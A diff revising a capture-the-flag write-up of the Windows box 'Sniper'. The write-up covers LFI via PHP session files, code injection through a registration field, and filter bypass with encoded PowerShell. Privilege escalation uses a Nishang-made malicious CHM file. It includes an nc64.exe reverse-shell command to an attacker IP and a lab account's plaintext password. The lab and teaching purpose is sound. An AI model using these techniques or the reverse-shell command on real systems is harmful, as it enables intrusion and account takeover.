@@ -7,15 +7,14 @@ published: true
 ![Sniper](/assets/Sniper/Sniper.png)
 
 ### Summary
-- The box is a **Windows** machine **hosting a PHP website** which had both a **LFI** (intended) and **RFI** (unintended) vulnerabilities.
+- The box is a **Windows** machine **hosting a PHP website** which had both a **LFI** (intended) and a **RFI** (unintended) vulnerabilities.
 - *Down the LFI path, and after working around some* **blacklisting** *and* **hardening**, we manage to **inject PHP code into the cookies** and **include them to gain RCE.**
-- We gain initial access as `NT Authority\iusr`. And, *as we are taking a look around the web root*, we find **credentials** for a local user called `chris` in the **database settings file.**
+- We gain initial access as `NT Authority\iusr`. And, *as we are taking a look around the* **web root**, we find **credentials** for a local user called `chris` in the **database settings file.**
 - We used **PowerShell** to gain **another reverse shell** as that user and started looking for ways to escalate our privileges.
 - *In `chris`'s `Downloads` folder*, we found a file called `instructions.chm` which mentioned **some documentation work to be delivered to the company's CEO**.
-- *Also relevant to the same topic,* a folder called `Docs` in the root of the `C:` drive.
-- The folder contained a **note for the developer** (`chris`) from the CEO **asking for the documentation to be dropped there** when done.
+- *Also relevant to the same topic,* a folder called `Docs` in the root of the `C:` drive contained a **note for the developer** (`chris`) from the CEO **asking for the documentation to be dropped there** when done.
 - *To exploit the situation*, we create a **malicious .CHM file** using the **Nishang PowerShell Suite** to **execute commands** if that file was opened.
-- *After placing the file in the `Docs` folder*, a few moments pass and the file gets removed. We verify execution of our payload (resetting the `administrator`'s password) by logging in and we're authenticated successfully.
+- *After placing the file in the `Docs` folder*, a few moments pass and the file gets removed. We **verify execution of our payload** (resetting the `administrator`'s password) by logging in and we're successfully authenticated.
 
 ---
 
@@ -43,15 +42,15 @@ Host script results:
 |_clock-skew: 6h59m59s
 ```
 
-Nmap gives a few things to check:
-1. Port 80
+Nmap gives us a few things to check:
+1. **HTTP** on Port 80
 2. **RPC** on port 135
 3. **SMB** on port 445
 
 We start with **SMB** and **RPC** since they are a quick check.
 
 ### SMB Enumeration
-we check the usual null, anonymous and guest authentication with `crackmapexec` but don't get much past the **OS** and the **hostname**.
+we check the usual **null, anonymous and guest authentication** with `crackmapexec` but don't get much past the **OS** and the **hostname**.
 ![SMB-Enum](/assets/Sniper/SMB-Enum.jpg)
 
 ### RPC Enumeration
@@ -182,7 +181,7 @@ and try including it
 **Cookies** are a good place to start because:
 - **PHP stores the username inside them** & **we have the ability to register users**
 - *Also, In Windows, by default,* they are kept in a *likely accessible* directory `"c:\windows\temp"`
-- Their file name has a known format: `"sess_<PHP_SESSID_COOKIE_VALUE>"`
+- Their file name has a known format: "`sess_<PHP_SESSID_COOKIE_VALUE>`"
 
 So we need to:
 1. Be able to **write PHP code** into the **username field** in the **registration form**
@@ -199,11 +198,11 @@ We used:
 - **Username:** `"a"`
 - **Password:** `"a"`
 
-This use has a special type of security. No one could ever guess creds like these :D :D :D
+***This user has a special type of security. No one could ever guess creds like these :D :D***
 
-*Jokes aside,* here are the **requests and responses for the registration and login**.
+*Jokes aside,* here are the **requests and responses for both the registration and login**.
 
-the response we got was a **302 redirection to the initial login page**
+*Upon submitting the registration request,* the response we got was a **302 redirection to the initial login page**
 
 ![registratio-initial-request](/assets/Sniper/registratio-initial-request.jpg)
 
@@ -231,10 +230,10 @@ But that doesn't work and we **get an error page**
 ![lfi-no-full-path](/assets/Sniper/lfi-no-full-path.jpg)
 
 *After many many tries:*
-- **Normal traversal sequences** like `../../`
-- **Nested** ones such as `....//` or `....\/`
-- **Single** and **Double URL encoding**
-- and other techniques..
+- [X] **Normal traversal sequences** like `../../`
+- [X] **Nested** ones such as `....//` or `....\/`
+- [X] **Single** and **Double URL encoding**
+- [X] and other techniques..
 
 I found out that I could include the cookie like this:
 ```
@@ -244,10 +243,10 @@ I found out that I could include the cookie like this:
 ![lfi-abs-path-success](/assets/Sniper/lfi-abs-path-success.jpg)
 
 That's because the **PHP** code is likely:
-1. **Not accepting** any `..` sequences
-2. **Not accepting** `c:` in the request
-3. **Doesn't like the path** when it's missing a `/` or `\` in the beggining
-4. **But is alright with specifying the path without the** `c:` **part**
+- **Not accepting** any `..` sequences
+- **Not accepting** `c:` in the request
+- **Doesn't like the path** when it's missing a `/` or `\` in the beggining
+- **But is alright with specifying the path without the** `c:` **part**
 
 We now know that **we can include the input of the username field into the HTML.**
 
@@ -297,8 +296,7 @@ and the allowed ones:
 ```
 
 this is good! Because:
-- `<` and `>` are the **tags** needed to **inject PHP**
-- `?` is used in the declaration
+- `<`, `>` and `?` are need for the **tags** needed to **inject PHP**
 - and the **backtick** can be used for **code execution** (*just like in* **Bash**)
 
 we can craft a **payload** like this:
@@ -310,18 +308,18 @@ we can craft a **payload** like this:
 
 ![rce-achieved](/assets/Sniper/rce-achieved.jpg)
 
-*with RCE achieved,* we have to find a way to **execute a reverse shell with the allowed characters we have.**
+*with* **RCE** *achieved,* we have to find a way to **execute a reverse shell with the allowed characters we have.**
 
 **We have a couple of challenges here:**
 - the **dollar sign** (`$`), the **brackets** `(` and `[` along with the **underscore** (`_`) are blocked, which enable the standard **PHP backdoor** `<?php exec($_REQUEST["cmd"]);?>`
-- *also,* the **dot** (`.`) is blocked, so we can't use our **ip address** in the payload to download something by either HTTP or SMB
+- *also,* the **dot** (`.`) is blocked, so we can't use our **ip address** in the payload to download something.
 - *And, with the* **backslash** `\` *blocked as well,* it means **writing to paths other that the current directory isn't allowed**
 
 *when thinking about using* **PowerShell** *in execution,* I remembered that we could use the encoded switch `-E` and pass **base64-encoded commands.**
 
 This **feature** was *initially built* to **make handling tricky sequences of special characters easier.**
 
-*Even though the dash* (`-`) *is blocked*, this trick is still accessible with the *whitelisted* **forward slash** (`/`).
+*Even though the dash* (`-`) *is blocked*, **this trick is still doable** with the *whitelisted* **forward slash** (`/`).
 
 This is similar to **regular windows commands** (ex: `ipconfig /all`)
 
@@ -343,14 +341,14 @@ which is:
 \\10.10.16.3\s\nc64.exe -e powershell 10.10.16.3 9000
 ```
 
-*thankfully, after all this hard work,* we're rewarded with a **sweeet reverse shell :D**
+*thankfully, after all this hard work,* we're rewarded with a **reverse shell :D**
 
 ![shell-as-iusr](/assets/Sniper/shell-as-iusr.jpg)
 
 ### Finding creds in the database settings file (like always)
-*The first I did after getting the shell,* was **check the files in the web root.**
+*The first thing I did after getting the shell,* was **check the files in the web root.**
 
-I find a file called `db.php` in the `C:\inetpub\wwwroot\user` directory.
+I found a file called `db.php` in the `C:\inetpub\wwwroot\user` directory.
 
 **The contents were:**
 
@@ -365,9 +363,9 @@ The password works for `chris`
 ![got-chris](/assets/Sniper/got-chris.jpg)
 
 ### Getting a shell as Chris
-The situation is that we want to pivot to the `chris` user **without losing the shell** (*that we worked so hard for XD*)
+The situation is that we want to pivot to the `chris` user **without losing the shell** *if possible*
 
-We can do so from our **PowerShell** reverse shell using the below method:
+We can do so from our **PowerShell** prompt using the below method:
 
 ```powershell
 $cred = New-Object System.Management.Automation.PSCredential ("Sniper\chris", (ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force))
@@ -379,7 +377,7 @@ we're basically **creating a** `credential` **object** for the `chris` user and 
 
 ![shell-as-chris](/assets/Sniper/shell-as-chris.jpg)
 
-Sweet :D
+**Neat :)**
 
 ### Privilege Escalation: Scanning the file system
 *When checking the folders in chris's user profile,* we find a file called `intructions.chm` in his `Downloads` folder.
@@ -396,9 +394,9 @@ We **copy it over to our Kali using the SMB share.**
 - There's **a project of an android app** *in development*
 - **That document** looks like **a draft for its documentation**
 
-*other than that, according to the text,* it seems like the chris guy is really stressed out and thinking about quitting the his job because the CEO is overloading him with work.
+*other than that, according to the text,* it seems like the chris guy is really stressed out and thinking about quitting his job because the CEO is overloading him with work.
 
-We don't know if this information would be handy or not. But we take note of it and move on.
+We don't know if this information would be handy or not. But we take note of it nonetheless and move on.
 
 *In the system root* (`c:\`), we find a folder that **sticks out:** `Docs`
 
@@ -407,7 +405,7 @@ We don't know if this information would be handy or not. But we take note of it 
 ![docs-and-note-txt](/assets/Sniper/docs-and-note-txt.jpg)
 
 *Apart from the CEO bullying the chris guy,*  
-*and even leaving him a copy of* `"php for dummies-trial.pdf"` *as further insult,*  
+*and even leaving him a copy of* `"php for dummies-trial.pdf"` *as further insult XD*  
 
 - he is **asking about the documentation for the new app** (*very possibly referring to the android project in development*).
 - and **wants him to drop it into this folder** `"c:\Docs"` once done.
@@ -416,10 +414,10 @@ Sounds like we need to **create a malicious** `.chm` file and put it there.
 
 *if the CEO happens to be the local `administrator` and opens the file,* we should root the box.
 
-### Malicious CHM files For The Win
-*Searching* **Google**, we come accross this [blog](/assets/Sniper/https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e) explaining exactly **how to execute a payload using a `.chm` file** using a script from the **Nishang script suite.**
+### CHM Files for the win
+*Searching* **Google**, we come accross this [blog](https://medium.com/r3d-buck3t/weaponize-chm-files-with-powershell-nishang-c98b93f79f1e) explaining exactly **how to execute a payload using a `.chm` file** using a script from the **Nishang script suite.**
 
-*Following the article,* we download the **"HTML Help Workshop and Documentation program"** and **get the script** from the [Github Repository](/assets/Sniper/https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1).
+*Following the article,* we download the **"HTML Help Workshop and Documentation program"** and **get the script** from the [Github Repository](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1).
 
 We **import** the `Out-CHM.ps1` file and use it to get a `doc.chm` file
 
@@ -427,7 +425,7 @@ We **import** the `Out-CHM.ps1` file and use it to get a `doc.chm` file
 
 *After copying it to the `Docs` folder and waiting a few moments,* The `.chm` file **gets executed**. and **the Administrator's password is changed**
 
-We confirmed with `crackmapexec`
+We confirm with `crackmapexec`
 
 ![got-admin](/assets/Sniper/got-admin.jpg)
 
